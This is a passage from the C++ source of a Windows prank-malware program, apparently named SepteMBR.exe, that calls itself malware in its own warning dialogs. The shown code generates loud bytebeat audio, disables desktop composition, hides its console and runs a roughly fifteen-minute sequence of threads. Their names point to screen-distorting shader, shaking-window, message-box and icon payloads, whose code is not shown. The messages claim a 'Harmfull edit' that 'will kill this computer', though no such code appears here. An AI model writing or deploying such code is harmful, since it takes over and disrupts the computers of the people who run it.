    waveOutClose(hWaveOut);
}
VOID WINAPI sound19() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t - (t >> 2) & t >> 10) - 1 | t * 5 & t >> 7 | t * 9 & t >> 4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound20() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(log(((t >> 6) >> (t * 5)) & (int)(sin(t * 360.0) * 255.0) + 1) * 255.0);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound21() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t & (t * 32 | t * 8 | t * 6 & t >> 4 | t >> 8 & t << 2));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound22() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (0xCA98CA98 >> (t >> 9 & 14) & 15) | t >> 8) ^ (t >> 6 & 1 ? t >> 5 : (0 - t) >> 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound23() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * 8 & t >> 5 | t * (t >> 12) | t ^ t >> t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound24() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 7891, 7891, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[7891 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t >> 5 * (t ^ t >> 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound25() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        if (t >> 4 != 0)buffer[t] = static_cast<char>((t * 2 & t >> 9 | t << t / t >> 4) + (t & t >> 11 | t << t / t >> 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound26() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t * 3) | (t >> 5) & (t >> 7)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound27() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & t / 2 & t / 4) * t / 114514);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound28() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(sin(t * 9 & t >> 4) * tan(t * 5 & t >> 7) * sin(t * 3 & t >> 10));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound29() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(cbrt(t >> 4 | t >> 5 | t >> 6 | t >> 7 | t >> 8) * t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound30() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((rand() % 255) | (t >> 2 | t >> 7) & (t >> 6 & t >> 8) ^ (rand() % 48));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void clean() {
    InvalidateRect(0, 0, 0);
    Sleep(100);
}
void SPtime() {
    Sleep(30000);
}
void StopHandle(HANDLE hdl) {
    TerminateThread(hdl, 0);
    CloseHandle(hdl);
    clean();
}
void runSP() {
    DwmEnableComposition(0);
    HANDLE wnd1 = CreateThread(NULL, 0, Window1_Msgbox, NULL, 0, NULL);
    HANDLE wnd2 = CreateThread(NULL, 0, Window2_Shake, NULL, 0, NULL);
    clean();
    sound1();
    HANDLE th1 = CreateThread(NULL, 0, Shader1_NoName1, NULL, 0, NULL);
    SPtime();
    StopHandle(th1);
    sound2();
    HANDLE th2 = CreateThread(NULL, 0, Shader2_NoName2, NULL, 0, NULL);
    SPtime();
    StopHandle(th2);
    sound3();
    HANDLE th3 = CreateThread(NULL, 0, Shader3_NoName3, NULL, 0, NULL);
    SPtime();
    StopHandle(th3);
    sound4();
    HANDLE th4 = CreateThread(NULL, 0, Shader4_NoName4, NULL, 0, NULL);
    HANDLE fh1 = CreateThread(NULL, 0, Payload1_Icons, NULL, 0, NULL);
    SPtime();
    StopHandle(th4);
    sound5();
    HANDLE th5 = CreateThread(NULL, 0, Shader5_NoName5, NULL, 0, NULL);
    HANDLE fh2 = CreateThread(NULL, 0, Payload2_Icons2, NULL, 0, NULL);
    SPtime();
    StopHandle(th5);
    sound6();
    HANDLE th6 = CreateThread(NULL, 0, Shader6_NoName6, NULL, 0, NULL);
    SPtime();
    StopHandle(th6);
    sound7();
    HANDLE th7 = CreateThread(NULL, 0, Shader7_NoName7, NULL, 0, NULL);
    SPtime();
    StopHandle(th7);
    sound8();
    HANDLE th8 = CreateThread(NULL, 0, Shader8_NoName8, NULL, 0, NULL);
    SPtime();
    StopHandle(th8);
    sound9();
    HANDLE th9 = CreateThread(NULL, 0, Shader9_NoName9, NULL, 0, NULL);
    SPtime();
    StopHandle(th9);
    sound10();
    HANDLE th10 = CreateThread(NULL, 0, Shader10_NoName10, NULL, 0, NULL);
    SPtime();
    StopHandle(th10);
    sound11();
    HANDLE th11 = CreateThread(NULL, 0, Shader11_NoName11, NULL, 0, NULL);
    SPtime();
    StopHandle(th11);
    sound12();
    HANDLE th12 = CreateThread(NULL, 0, Payload3_Rotate, NULL, 0, NULL);
    SPtime();
    StopHandle(th12);
    sound13();
    HANDLE th13 = CreateThread(NULL, 0, Shader12_NoName12, NULL, 0, NULL);
    SPtime();
    StopHandle(th13);
    sound14();
    HANDLE th14 = CreateThread(NULL, 0, Shader13_NoName13, NULL, 0, NULL);
    HANDLE fh3 = CreateThread(NULL, 0, Payload4_Icons3, NULL, 0, NULL);
    SPtime();
    StopHandle(th14);
    StopHandle(fh1);
    sound15();
    HANDLE th15 = CreateThread(NULL, 0, Shader14_NoName14, NULL, 0, NULL);
    SPtime();
    StopHandle(th15);
    sound16();
    HANDLE th16 = CreateThread(NULL, 0, Shader15_NoName15, NULL, 0, NULL);
    SPtime();
    StopHandle(th16);
    sound17();
    HANDLE th17 = CreateThread(NULL, 0, Shader16_NoName16, NULL, 0, NULL);
    SPtime();
    StopHandle(th17);
    sound18();
    HANDLE th18 = CreateThread(NULL, 0, Shader17_NoName17, NULL, 0, NULL);
    SPtime();
    StopHandle(th18);
    sound19();
    HANDLE th19 = CreateThread(NULL, 0, Shader18_NoName18, NULL, 0, NULL);
    SPtime();
    StopHandle(th19);
    sound20();
    HANDLE th20 = CreateThread(NULL, 0, Shader19_NoName19, NULL, 0, NULL);
    SPtime();
    StopHandle(th20);
    sound21();
    HANDLE th21 = CreateThread(NULL, 0, Shader20_NoName20, NULL, 0, NULL);
    SPtime();
    StopHandle(th21);
    sound22();
    HANDLE th22 = CreateThread(NULL, 0, Shader21_NoName21, NULL, 0, NULL);
    SPtime();
    StopHandle(th22);
    sound23();
    HANDLE th23 = CreateThread(NULL, 0, Shader22_NoName22, NULL, 0, NULL);
    SPtime();
    StopHandle(th23);
    sound24();
    HANDLE th24 = CreateThread(NULL, 0, Shader23_NoName23, NULL, 0, NULL);
    SPtime();
    StopHandle(th24);
    sound25();
    HANDLE th25 = CreateThread(NULL, 0, Shader24_NoName24, NULL, 0, NULL);
    SPtime();
    StopHandle(th25);
    sound26();
    HANDLE th26 = CreateThread(NULL, 0, Shader25_NoName25, NULL, 0, NULL);
    SPtime();
    StopHandle(th26);
    sound27();
    HANDLE th27 = CreateThread(NULL, 0, Shader26_NoName26, NULL, 0, NULL);
    SPtime();
    StopHandle(th27);
    sound28();
    HANDLE th28 = CreateThread(NULL, 0, Shader27_NoName27, NULL, 0, NULL);
    SPtime();
    StopHandle(th28);
    sound29();
    HANDLE th29 = CreateThread(NULL, 0, Shader28_NoName28, NULL, 0, NULL);
    SPtime();
    StopHandle(fh2);
    StopHandle(fh3);
    StopHandle(th29);
    sound30();
    HANDLE th30 = CreateThread(NULL, 0, Shader29_Last, NULL, 0, NULL);
    HANDLE fh4 = CreateThread(NULL, 0, Payload5_Icon4, NULL, 0, NULL);
    SPtime();
    StopHandle(fh4);
    StopHandle(th30);
    StopHandle(wnd1);
    StopHandle(wnd2);
}
int main() {
    SetProcessDPIAware();
    srand(time(NULL));
    FreeConsole();
    LPCWSTR MessageTextFirst = L"Warning!!!\n\nDo you want to run me??I am a malware!Please do not run my Harmfull edit on your important computer if you want to live.I AM NOT TALKING A JOKE!!THIS IS REAL.And I must tell you something is quite important:DO NOT run my Harmfull edit on PUBLIC OR IMPORTANT COMPUTER!!If you want run my Harmfull edit,you can run my Harmfull edit on VM or not important computer.DO NOT COPY MY CODE IF YOU DO NOT WANT TO BE A GAY AND KILL YOUR PARANTS!!!!!!\n\nby github@uiui-sod  bilibili@uiui-RuYiShiQu";
    LPCWSTR MessageTextSecond = L"Last warning\n\nWell you maybe still do not know what is happening,and I will tell you:You just run a malware(me),If you want to continue,click Yes button,else click No button.Malware is an APP,there has two edit,first is Harmfull,it will kill this computer,second is Harmless,it will not kill the system but little break the CPU.So,can you decide??";
    if (MessageBoxW(0, MessageTextFirst, L"SepteMBR.exe-warning", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
    else {
        if (MessageBoxW(0, MessageTextSecond, L"SepteMBR.exe-last warning", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
        else {
            runSP();
        }
    }
    return 0;
}